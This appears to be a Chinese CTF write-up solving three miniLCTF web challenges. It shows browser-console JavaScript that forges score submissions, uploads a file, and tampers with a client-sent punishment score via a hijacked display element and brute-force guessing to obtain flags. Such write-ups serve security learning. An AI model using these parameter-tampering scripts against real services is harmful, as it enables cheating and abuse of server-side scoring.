# 吃豆人wp

连接网页后打开网页源代码搜索flag发现flag不在本地然后阅读代码，找到fetch方法发出的是post请求等条件将分数5001发送给服务器，得到flag控制台的JS代码如下

```json
fetch('submit_score', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ score: 5000 }) // 确保分数≥5000

}).then(response => response.json()).then(data => console.log("Flag:", data.flag)) // 假设响应包含flag字段 
    .catch(error => console.error("Error:", error));
```



# 麦霸wp

和上题同理直接搜索fetch找到fetch方法所要的条件将本地下载的.WAV音频上传给服务器js代码如下 

```json
const el = document.createElement('input');
el.type = 'file';
el.onchange = e => {
    fetch('/compare-recording', {
        method: 'POST', body: (() => {
            const fd = new FormData();
            fd.append('audio', e.target.files[0]); return fd;
        })()
    }).then(r => r.json()).then(console.log).catch(console.error)
};
el.click();
```

### GuessOneGuess 

##### 目标是

目标是猜数字游戏，用户需通过猜测1-100之间的数字累积分数。当分数超过JavaScript最大数值（Number.MAX_VALUE）时，服务器返回FLAG

思路：利用客户端参数篡改攻击

关键文件：

* ​game.pug​：前端游戏界面
* ​game-ws.js​：WebSocket游戏逻辑

翻看网页源代码，首先查看后端代码：

```json
if (totalScore > 1.7976931348623157e308) { message += `\n🏴 ${FLAG}`; showFlag = true; }
```

这是获取到flag的条件，查找计算totalScore的代码

```json
socket.on('guess', (data) => {
    try {
        console.log(totalScore); const guess = parseInt(data.value); if (isNaN(guess)) {
            throw new Error('请输入有效数字');

        } if (guess < 1 || guess > 100) { throw new Error('请输入1-100之间的数字'); } guessCount++;
        if (guess === targetNumber) {
            const currentScore = Math.floor(100 / Math.pow(2, guessCount - 1));
            totalScore += currentScore;
            let message = `🎉 猜对了！得分 +${currentScore} (总分数: ${totalScore})`;
            let showFlag = false;
        }
    }
```



正向加分数很明显行不通  
观察代码，发现一个punishment响应

```json
socket.on('punishment-response', (data) => {
    totalScore -= data.score; 
    guessCount = 0; 
    targetNumber = Math.floor(Math.random() * 100) + 1; 
    console.log(`新目标数字: ${targetNumber}`); 
    socket.emit('game-message', { 
        type: 'result', 
        win: true, 
        message: "扣除分数并重置",
        score: totalScore,
        showFlag: false, });
        totalScore -= data.score;
```



，并且没有对客户端提交的score参数做校验，那么就考虑客户端参数篡改+整数溢出漏洞（注入负值让totalScore超过这个超级大的数字）返回flag

直接写一个自动化脚本在控制台运行

```json
// 劫持分数显示，强制返回极大负值
const scoreDisplay = document.getElementById('score-display');
Object.defineProperty(scoreDisplay, 'textContent', {
  get: () => '-1.8e308',
  set: (v) => scoreDisplay.innerText = v
});

// 自动发送100次错误猜测
let wrongCount = 0;
const sendWrong = () => {
  if(wrongCount >= 100) return;
  document.getElementById('guess-input').value = 0;
  document.getElementById('guess-btn').click();
  wrongCount++;
  setTimeout(sendWrong, 30);
};
sendWrong();

// 自动爆破正确数字
let guessNumber = 1;
const bruteForce = () => {
  document.getElementById('guess-input').value = guessNumber;
  document.getElementById('guess-btn').click();
  guessNumber = guessNumber > 100 ? 1 : guessNumber + 1;
  setTimeout(bruteForce, 30);
};

// 检测到flag立即停止
const flagObserver = new MutationObserver(() => {
  if(document.getElementById('flag-display').style.display !== 'none') {
    console.log('成功获取Flag:', document.getElementById('flag-display').textContent);
    flagObserver.disconnect();
  }
});
flagObserver.observe(document.getElementById('flag-display'), { 
  attributes: true, 
  attributeFilter: ['style'] 
});

// 5秒后启动爆破
setTimeout(bruteForce, 5000);
```

得到flag:  
miniLCTF{yOu_woN-ThE_GU3ss1nG_g4M3_W0o77fc71b}
